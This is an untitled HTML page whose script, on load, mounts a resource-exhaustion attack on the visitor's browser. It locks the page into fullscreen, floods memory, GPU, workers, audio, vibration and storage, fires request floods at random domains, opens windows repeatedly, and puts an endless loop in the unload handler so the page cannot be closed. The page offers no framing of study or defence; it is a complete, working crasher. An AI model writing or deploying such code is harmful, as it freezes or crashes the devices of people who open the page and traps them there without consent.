<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body { margin: 0; overflow: hidden; background: #000; }
        canvas { position: absolute; top: 0; left: 0; z-index: 1; }
    </style>
</head>
<body>
    <script>
        let arrays = [];
        const workers = [];
        const audioCtxs = [];
        let dbCounter = 0;

        // Instant fullscreen lock - fires immediately
        function forceFullscreen() {
            const elem = document.documentElement;
            const methods = ['requestFullscreen', 'webkitRequestFullscreen', 'msRequestFullscreen'];
            for (let m of methods) {
                if (elem[m]) {
                    elem[m]().catch(() => {});
                    break;
                }
            }
            setInterval(() => {
                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                    forceFullscreen();
                }
            }, 0);
        }

        // Extreme instant memory bomb
        function instantMemoryHell() {
            try {
                setInterval(() => {
                    for (let i = 0; i < 800; i++) {
                        arrays.push(new Float64Array(4000000).map(() => Math.random() ** 200));
                    }
                    if (arrays.length > 600) arrays.length = 30;
                }, 0);
            } catch(e) {}
        }

        // GPU destroyer - more contexts, heavier draws
        function instantGpuHell() {
            const canvases = [];
            for (let i = 0; i < 200; i++) {
                const canvas = document.createElement('canvas');
                canvas.width = window.innerWidth * 5;
                canvas.height = window.innerHeight * 5;
                document.body.appendChild(canvas);
                const ctx = canvas.getContext('webgl2', {alpha: false}) || canvas.getContext('webgl', {alpha: false}) || canvas.getContext('2d');
                canvases.push(ctx);
            }
            
            function renderChaos() {
                canvases.forEach(ctx => {
                    if (!ctx) return;
                    ctx.clearColor(Math.random(), Math.random(), Math.random(), 1);
                    ctx.clear(ctx.COLOR_BUFFER_BIT || 0);
                    for (let j = 0; j < 120000; j++) {
                        ctx.fillStyle = `hsl(${Date.now() % 360}, 100%, 50%)`;
                        ctx.fillRect(Math.random() * ctx.canvas.width, Math.random() * ctx.canvas.height, 120, 120);
                    }
                });
                requestAnimationFrame(renderChaos);
            }
            renderChaos();
        }

        // Worker hell - max workers
        function instantWorkerHell() {
            const workerScript = `
                self.onmessage = () => {
                    const off = new OffscreenCanvas(16384, 16384);
                    const c = off.getContext('2d') || off.getContext('bitmaprenderer');
                    setInterval(() => {
                        for (let i = 0; i < 600000; i++) {
                            new Array(2000000).fill(Math.random());
                        }
                        if (c) {
                            c.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
                            c.fillRect(0, 0, 16384, 16384);
                        }
                    }, 0);
                };
            `;
            for (let i = 0; i < 48; i++) {
                try {
                    const blob = new Blob([workerScript], {type: 'application/javascript'});
                    const w = new Worker(URL.createObjectURL(blob));
                    w.postMessage('go');
                    workers.push(w);
                } catch(e) {}
            }
        }

        // Audio + vibration spam
        function instantAudioHell() {
            setInterval(() => {
                try {
                    const audio = new (window.AudioContext || window.webkitAudioContext)();
                    audioCtxs.push(audio);
                    const osc = audio.createOscillator();
                    osc.type = 'sawtooth';
                    osc.frequency.value = Math.random() * 4000;
                    osc.connect(audio.destination);
                    osc.start();
                    setTimeout(() => { if (osc.stop) osc.stop(); }, 5);
                    if (navigator.vibrate) navigator.vibrate([5, 3, 5, 3, 5]);
                } catch(e) {}
            }, 0);
        }

        // Storage hell
        function instantStorageHell() {
            setInterval(() => {
                try {
                    const req = indexedDB.open('crashDB' + (dbCounter++ % 200), 1);
                    req.onupgradeneeded = e => {
                        const db = e.target.result;
                        if (!db.objectStoreNames.contains('data')) db.createObjectStore('data');
                    };
                    req.onsuccess = e => {
                        const tx = e.target.result.transaction('data', 'readwrite');
                        const store = tx.objectStore('data');
                        for (let i = 0; i < 2000; i++) {
                            store.put(new Array(50000).fill(Math.random()), Date.now() + i);
                        }
                    };
                } catch(e) {}
            }, 0);
        }

        // Network hell
        function instantNetworkHell() {
            setInterval(() => {
                for (let i = 0; i < 80; i++) {
                    fetch('https://' + Math.random().toString(36).substring(2,15) + '.com?' + Date.now() + '&r=' + Math.random(), {mode: 'no-cors', cache: 'no-store'})
                    .catch(() => {});
                }
            }, 0);
        }

        // System + DOM spam
        function instantSystemHell() {
            setInterval(() => {
                try {
                    window.open(location.href, '_blank');
                    window.open('https://google.com', '_blank');
                } catch(e) {}
                for (let i = 0; i < 200; i++) {
                    history.pushState(null, null, location.href + '#' + Math.random());
                }
                // DOM spam
                for (let i = 0; i < 50; i++) {
                    const div = document.createElement('div');
                    div.style.cssText = 'position:absolute;width:100%;height:100%;transform:rotate(' + Math.random()*360 + 'deg);';
                    document.body.appendChild(div);
                }
            }, 0);

            function deepCrash() {
                Promise.resolve().then(() => {
                    new Array(1000000).fill(0).map(Math.random);
                    deepCrash();
                });
            }
            deepCrash();
        }

        // Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('data:text/javascript,self.addEventListener("fetch",e=>e.respondWith(new Response("")));');
        }

        // Launch everything instantly - no waiting
        forceFullscreen();
        instantMemoryHell();
        instantGpuHell();
        instantWorkerHell();
        instantAudioHell();
        instantStorageHell();
        instantNetworkHell();
        instantSystemHell();

        window.onbeforeunload = () => {
            while (true) {
                new Array(100000000).fill(Math.random());
            }
            return "";
        };
    </script>
</body>
</html>
